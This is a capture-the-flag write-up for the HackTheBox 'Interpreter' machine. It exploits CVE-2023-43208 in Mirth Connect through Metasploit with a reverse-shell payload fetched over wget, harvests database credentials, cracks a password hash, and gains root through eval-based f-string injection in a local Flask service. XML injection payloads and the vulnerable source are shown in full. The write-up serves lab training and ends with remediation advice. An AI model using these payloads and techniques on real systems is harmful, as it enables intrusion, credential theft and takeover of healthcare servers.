# HackTheBox — Interpreter (Medium, Linux)

**Target IP:** `10.129.xx.xx`
**VPN/Attacker IP:** `10.10.xx.xx`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-22 07:10 +0545
Nmap scan report for 10.129.xx.xx
Host is up (0.65s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 <REDACTED_FINGERPRINT> (ECDSA)
|_  256 <REDACTED_FINGERPRINT> (ED25519)
80/tcp  open  http     Jetty
|_http-title: Mirth Connect Administrator
| http-methods:
|_  Potentially risky methods: TRACE
443/tcp open  ssl/http Jetty
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
|_http-title: Mirth Connect Administrator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.25 seconds
```

Three open ports: SSH (22), and HTTP/HTTPS (80/443) both serving **Mirth Connect Administrator** — an open-source healthcare integration engine (HL7 interface engine) running on Jetty.

---

## 2. Vulnerability Identification

The Mirth Connect Administrator interface is identified as vulnerable to:

> **CVE-2023-43208** — A Mirth Connect (NextGen Connect) authentication bypass and remote code execution vulnerability, affecting versions prior to 4.4.1.

---

## 3. Exploitation — Unauthenticated RCE (CVE-2023-43208)

A Metasploit module exists for this vulnerability: `exploit/multi/http/mirth_connect_cve_2023_43208`.

### 3.1 Module Configuration

```
msf exploit(multi/http/mirth_connect_cve_2023_43208) > show options

Module options (exploit/multi/http/mirth_connect_cve_2023_43208):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, socks5h, http, s
                                         apni
   RHOSTS     10.129.xx.xx     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous handles, requires Linux ≥3.17 (for Python va
                                              riant also Python ≥3.8, tested shells are sh, bash, zsh) (Accepted: none, python3.8+, shell-search, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving payload
   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST           10.10.xx.xx      yes       The listen address (an interface may be specified)
   LPORT           9001             yes       The listen port


   When FETCH_COMMAND is one of CURL,GET,WGET:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly to the shell.


   When FETCH_FILELESS is none:

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      <RANDOM>         no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces


Exploit target:

   Id  Name
   --  ----
   0   Unix Command


View the full module info with the info, or info -d command.
```

### 3.2 Verifying the Vulnerability

```
msf exploit(multi/http/mirth_connect_cve_2023_43208) > check
[*] 10.129.xx.xx:443 - The target appears to be vulnerable. Version 4.4.0 is affected by CVE-2023-43208.
```

### 3.3 Initial Exploit Attempt

```
msf exploit(multi/http/mirth_connect_cve_2023_43208) > exploit
[*] Started reverse TCP handler on 10.10.xx.xx:9001
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version 4.4.0 is affected by CVE-2023-43208.
[*] Executing cmd/linux/http/x64/meterpreter/reverse_tcp (Unix Command)
[+] The target appears to have executed the payload.
[*] Exploit completed, but no session was created.
```

The exploit fired but no session was established — likely the default `CURL` fetch method isn't available/working on the target.

### 3.4 Switching Fetch Method and Re-running

```
msf exploit(multi/http/mirth_connect_cve_2023_43208) > set FETCH_COMMAND WGET
FETCH_COMMAND => WGET
```

```
msf exploit(multi/http/mirth_connect_cve_2023_43208) > exploit
[*] Started reverse TCP handler on 10.10.xx.xx:9001
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version 4.4.0 is affected by CVE-2023-43208.
[*] Executing cmd/linux/http/x64/meterpreter/reverse_tcp (Unix Command)
[+] The target appears to have executed the payload.
[*] Sending stage (3090404 bytes) to 10.129.xx.xx
[*] Meterpreter session 1 opened (10.10.xx.xx:9001 -> 10.129.xx.xx:60850) at 2026-02-22 07:27:28 +0545
```

A session is established.

### 3.5 Confirming Access

```
meterpreter > getuid
Server username: mirth
```

```
meterpreter > shell
Process 4050 created.
Channel 1 created.

id
uid=103(mirth) gid=111(mirth) groups=111(mirth)
```

---

## 4. Foothold — Credential Harvesting from Mirth Connect

### 4.1 Upgrading to a Full TTY

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
```
```
mirth@interpreter:/usr/local/mirthconnect$
```

### 4.2 Reading the Mirth Configuration File

```bash
mirth@interpreter:/usr/local/mirthconnect/conf$ cat mirth.properties
```

The configuration file reveals extensive server settings, including database connectivity details and keystore secrets:

```properties
# Mirth Connect configuration file

# directories
dir.appdata = /var/lib/mirthconnect
dir.tempdata = ${dir.appdata}/temp

# ports
http.port = 80
https.port = 443

# password requirements
password.minlength = 0
password.minupper = 0
password.minlower = 0
password.minnumeric = 0
password.minspecial = 0
password.retrylimit = 0
password.lockoutperiod = 0
password.expiration = 0
password.graceperiod = 0
password.reuseperiod = 0
password.reuselimit = 0

# Only used for migration purposes, do not modify
version = 4.4.0

# keystore
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = <REDACTED_KEYSTORE_PASSWORD>
keystore.keypass = <REDACTED_KEYSTORE_KEYPASS>
keystore.type = JCEKS

# server
http.contextpath = /
server.url =

http.host = 0.0.0.0
https.host = 0.0.0.0
...

# options: derby, mysql, postgres, oracle, sqlserver
database = mysql

database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod

database.driver = org.mariadb.jdbc.Driver

database.max-connections = 20
database-readonly.max-connections = 20

# database credentials
database.username = mirthdb
database.password = <REDACTED_DB_PASSWORD>
...
```

Notably, the application's **password policy is fully disabled** (`password.minlength = 0`, etc.), and the file contains plaintext database credentials (`mirthdb` / `<REDACTED_DB_PASSWORD>`).

---

## 5. Lateral Movement — Database Credential Extraction & Cracking

### 5.1 Connecting to the MariaDB Database

```bash
mirth@interpreter:/usr/local/mirthconnect/conf$ mysql -u mirthdb -p
Enter password: <REDACTED_DB_PASSWORD>
```

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 39
Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

### 5.2 Enumerating Databases and Tables

```sql
MariaDB [(none)]> show databases;
```
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mc_bdd_prod         |
+--------------------+
2 rows in set (0.001 sec)
```

```sql
MariaDB [(none)]> use mc_bdd_prod;
```
```
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

### 5.3 Extracting Mirth Application User Credentials

```sql
MariaDB [mc_bdd_prod]> select * from PERSON;
```
```
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
| ID | USERNAME | FIRSTNAME | LASTNAME | ORGANIZATION | INDUSTRY | EMAIL | PHONENUMBER | DESCRIPTION | LAST_LOGIN          | GRACE_PERIOD_START | STRIKE_COUNT | LAST_STRIKE_TIME | LOGGED_IN | ROLE | COUNTRY       | STATETERRITORY | USERCONSENT |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
|  2 | sedric   |           |          |              | NULL     |       |             |             | 2025-09-21 17:56:02 | NULL               |            0 | NULL             |           | NULL | United States | NULL           |           0 |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
1 row in set (0.000 sec)
```

```sql
MariaDB [mc_bdd_prod]> select * from PERSON_PASSWORD;
```
```
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | <REDACTED_BASE64_HASH>                                    | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
1 row in set (0.000 sec)
```

A Mirth-managed OS-level user, `sedric`, has a stored password hash.

### 5.4 Decoding the Hash Format

Mirth Connect stores passwords as a Base64-encoded blob consisting of an 8-byte salt followed by a PBKDF2-HMAC-SHA256 digest. We decode and reformat it into a hashcat-compatible string:

```python
python3 -c "
import base64
data = base64.b64decode('<REDACTED_BASE64_HASH>')
salt = base64.b64encode(data[:8]).decode()
hash_ = base64.b64encode(data[8:]).decode()
print(f'sha256:600000:{salt}:{hash_}')
"
```

```
sha256:600000:<REDACTED_SALT>:<REDACTED_HASH>
```

### 5.5 Cracking the Hash

```bash
hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt
```

```
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
```

```
sha256:600000:<REDACTED_SALT>:<REDACTED_HASH>:<REDACTED_PASSWORD>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:600000:<REDACTED_SALT>:<REDACTED_HASH...>
Time.Started.....: Sun Feb 22 09:13:04 2026 (8 mins, 14 secs)
Time.Estimated...: Sun Feb 22 09:21:18 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       20 H/s (25.72ms) @ Accel:61 Loops:1000 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10004/14344385 (0.07%)
Rejected.........: 0/10004 (0.00%)
Restore.Point....: 9760/14344385 (0.07%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:599000-599999
Candidate.Engine.: Device Generator
Candidates.#01...: chiefs -> kenjie
Hardware.Mon.#01.: Util: 78%

Started: Sun Feb 22 09:13:02 2026
Stopped: Sun Feb 22 09:21:19 2026
```

The PBKDF2 hash cracks successfully against `rockyou.txt`, recovering the plaintext password for `sedric`.

---

## 6. Lateral Movement — SSH as sedric

```bash
ssh sedric@10.129.xx.xx
```

```
The authenticity of host '10.129.xx.xx (10.129.xx.xx)' can't be established.
ED25519 key fingerprint is: SHA256:<REDACTED>
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.xx.xx' (ED25519) to the list of known hosts.
sedric@10.129.xx.xx's password:
Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb 21 22:38:02 2026 from 10.10.xx.xx
sedric@interpreter:~$ id
uid=1000(sedric) gid=1000(sedric) groups=1000(sedric)
```

The cracked credential reused on the OS account works directly over SSH.

### 6.1 User Flag

```bash
sedric@interpreter:~$ cat user.txt
```
```
<REDACTED_USER_FLAG>
```

---

## 7. Privilege Escalation — Flask f-string Injection in notif.py

### 7.1 Identifying a Root-Owned Process

```bash
sedric@interpreter:/tmp$ ps aux | grep root
```
```
root           1  0.0  0.3 102056 12192 ?        Ss   Feb21   0:06 /sbin/init
root           2  0.0  0.0      0     0 ?        S    Feb21   0:00 [kthreadd]
...
root        3550  0.0  0.8 113604 32468 ?        Ss   Feb21   0:03 /usr/bin/python3 /usr/local/bin/notif.py
root        3561  0.0  0.0   5880  1012 tty1     Ss+  Feb21   0:00 /sbin/agetty -o -p -- \u --noclear - linux
root        3578  0.0  0.2  15452  9376 ?        Ss   Feb21   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
...
```

A custom script, `/usr/local/bin/notif.py`, is running as root.

### 7.2 Reading the Script

```bash
sedric@interpreter:/tmp$ ls -la /usr/local/bin/notif.py
-rwxr----- 1 root sedric 2332 Sep 19 09:27 /usr/local/bin/notif.py
```

The file is readable by `sedric` (group ownership).

```bash
sedric@interpreter:/tmp$ cat /usr/local/bin/notif.py
```

```python
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

### 7.3 Vulnerability Analysis

The script runs a Flask service **bound only to `127.0.0.1`**, listening on port `54321`, intended to receive trusted, pre-validated data from Mirth Connect (running locally) and write a formatted notification.

The critical flaw is in the `template()` function: it builds a Python **f-string** out of attacker-controllable input (`first`, `last`, `sender`, `ts`) and then runs it through `eval()`. Since f-strings evaluate any expression inside `{}` at runtime, **any value placed inside curly braces in the input becomes executable Python code**.

A regex whitelist is applied as a guard:

```python
pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
```

- **Allowed characters:** letters, digits, `.`, `_`, `'`, `"`, `(`, `)`, `{`, `}`, `=`, `+`, `/`
- **Forbidden:** spaces, commas, semicolons, backticks, and shell redirection characters (`>`, `&`, etc.)

Despite the restrictive character set, it still permits everything needed to call `__import__('os').popen(...)`, since:
- Underscores, parentheses, quotes, and dots are allowed (covers `__import__`, method calls, and string literals)
- Spaces can be avoided by using `+` for string concatenation or `chr(32)` to produce a space character

This makes it possible to construct a fully working Python expression — including a quoted, space-free OS command — entirely from the allowed character set.

### 7.4 Reaching the Internal Service

Since `notif.py` only accepts connections from `127.0.0.1:54321`, and we're SSH'd in as `sedric` (not localhost from our attacker box), we set up an SSH local port forward to reach it:

```bash
ssh -L 54321:127.0.0.1:54321 sedric@10.129.xx.xx
```

```
sedric@10.129.xx.xx's password:
Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb 21 23:50:22 2026 from 10.10.xx.xx
sedric@interpreter:~$
```

### 7.5 Crafting the Exploit Payload

**`exploit.xml`** — proof-of-concept to confirm code execution as root:

```xml
<patient>
  <firstname>{__import__('os').popen('id').read()}</firstname>
  <lastname>tester</lastname>
  <sender_app>MIRTH</sender_app>
  <timestamp>2026</timestamp>
  <birth_date>01/01/2000</birth_date>
  <gender>M</gender>
</patient>
```

The malicious payload sits inside the `<firstname>` field, formatted as a valid f-string expression that imports the `os` module and runs `id` via `popen`.

### 7.6 Triggering the Exploit

```bash
curl -i -X POST http://127.0.0.1:54321/addPatient \
     -H "Content-Type: application/xml" \
     --data-binary @exploit.xml
```

```
Patient uid=0(root) gid=0(root) groups=0(root)
 tester (M), 26 years old, received from MIRTH at 2026
```

The output confirms our injected Python expression executed `id` **as root** (`uid=0`), validating full remote code execution as root through the f-string injection.

### 7.7 Reading root.txt

**`payload.xml`:**

```xml
<patient>
  <firstname>{__import__('os').popen('cat'+chr(32)+'/root/root.txt').read()}</firstname>
  <lastname>tester</lastname>
  <sender_app>MIRTH</sender_app>
  <timestamp>2026</timestamp>
  <birth_date>01/01/2000</birth_date>
  <gender>M</gender>
</patient>
```

> Note the use of `'cat'+chr(32)+'/root/root.txt'` to build the command `cat /root/root.txt` without an actual space character, satisfying the regex whitelist (which disallows literal spaces) by generating the space at runtime via `chr(32)`.

```bash
curl -i -X POST http://127.0.0.1:54321/addPatient \
     -H "Content-Type: application/xml" \
     --data-binary @payload.xml
```

```
Patient <REDACTED_ROOT_FLAG>
 tester (M), 26 years old, received from MIRTH at 2026
```

### 7.8 Root Flag

```
<REDACTED_ROOT_FLAG>
```

---

## 8. Attack Chain Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Nmap scan | Identified SSH and Mirth Connect Administrator (Jetty) on 80/443 |
| 2 | Version identification | Mirth Connect 4.4.0, vulnerable to CVE-2023-43208 |
| 3 | Unauthenticated RCE via Metasploit module | Meterpreter/command shell as `mirth` |
| 4 | Read `mirth.properties` | Recovered plaintext MariaDB credentials and keystore passwords |
| 5 | Queried `mc_bdd_prod` database via MySQL/MariaDB client | Extracted `sedric`'s PBKDF2-HMAC-SHA256 password hash |
| 6 | Decoded Mirth's custom hash format, cracked with hashcat (`-m 10900`) + rockyou.txt | Recovered plaintext password for `sedric` |
| 7 | SSH login as `sedric` (password reused for OS account) | Stable shell access, user flag captured |
| 8 | Process enumeration found root-owned `notif.py` Flask service on `127.0.0.1:54321` | Identified target for privilege escalation |
| 9 | Source review revealed f-string injection via `eval()` on user-controlled XML fields, with an insufficiently restrictive regex whitelist | Confirmed exploitability |
| 10 | SSH local port-forward to reach the localhost-only service | Established access path |
| 11 | Crafted XML payload using `__import__('os').popen(...)` with `chr(32)` to bypass the space restriction | Arbitrary command execution as root |
| 12 | Read `/root/root.txt` via the injection | Root flag captured |

---

## 9. Tools Used

- `nmap` — port/service scanning
- `Metasploit Framework` (`exploit/multi/http/mirth_connect_cve_2023_43208`) — unauthenticated RCE exploitation
- `Meterpreter` — initial post-exploitation session
- Python 2/3 (`pty.spawn`) — TTY upgrade
- `mysql`/MariaDB client — database enumeration
- Python 3 (`base64`) — reformatting Mirth's custom password hash for cracking
- `hashcat` (mode 10900, PBKDF2-HMAC-SHA256) — offline hash cracking
- `ssh` (including `-L` local port forwarding) — lateral movement and reaching the localhost-bound vulnerable service
- `curl` — delivering the malicious XML payloads to the vulnerable Flask endpoint

---

## 10. Key Takeaways / Remediation

1. **Outdated Mirth Connect Version:** Running Mirth Connect 4.4.0 exposed the application to an unauthenticated RCE (CVE-2023-43208). The platform should be updated to a patched version (4.4.1+) immediately, and administrative interfaces should be restricted to trusted networks.
2. **Disabled Password Policy & Plaintext Secrets in Config Files:** `mirth.properties` had every password complexity/rotation control set to `0` (effectively disabled), and stored the database password and keystore passwords in plaintext. Configuration files containing secrets should be access-restricted, and secrets should ideally be pulled from a vault/secrets manager rather than stored in plaintext config.
3. **Password Reuse Between Application and OS Accounts:** The cracked Mirth application password for `sedric` was also valid for the corresponding Linux/SSH account. Application-layer and OS-layer credentials should always be distinct, unique, and independently rotated.
4. **Dangerous Use of `eval()` on User-Controlled F-Strings:** The `notif.py` script's core vulnerability was building an f-string template from untrusted input and evaluating it with `eval()`. This is a textbook code-injection pattern — f-strings (and any string passed to `eval`/`exec`) should **never** incorporate unsanitized user input, regardless of "safe templating" framing in comments.
5. **Insufficient Input Validation (Character Whitelist ≠ Safety):** The regex `^[a-zA-Z0-9._'\"(){}=+/]+$` was intended as a safety control but still permitted all characters necessary to construct a complete malicious Python expression — parentheses, quotes, underscores, and arithmetic operators are sufficient to build dangerous payloads even without spaces or semicolons. Input validation for code/template contexts must use an allow-list of expected *values* or a properly sandboxed templating engine — not merely a character-level filter, and especially not when the target sink is `eval()`.
6. **Trusting "Localhost-Only" as a Security Boundary:** The vulnerable service explicitly trusted requests purely based on `request.remote_addr == "127.0.0.1"`, assuming this guaranteed the request truly originated from the legitimate Mirth Connect process. In reality, *any* local user (or anyone able to reach localhost via port forwarding, as demonstrated) can satisfy this check. Defense should not rely solely on network/source-IP trust boundaries for services performing sensitive or privileged actions, especially when other local users exist on the same host.

---

*Flags and other sensitive values (hashes, passwords, salts) have been redacted. IP addresses replaced with placeholders (`10.129.xx.xx` for target, `10.10.xx.xx` for attacker/VPN) per the established convention.*
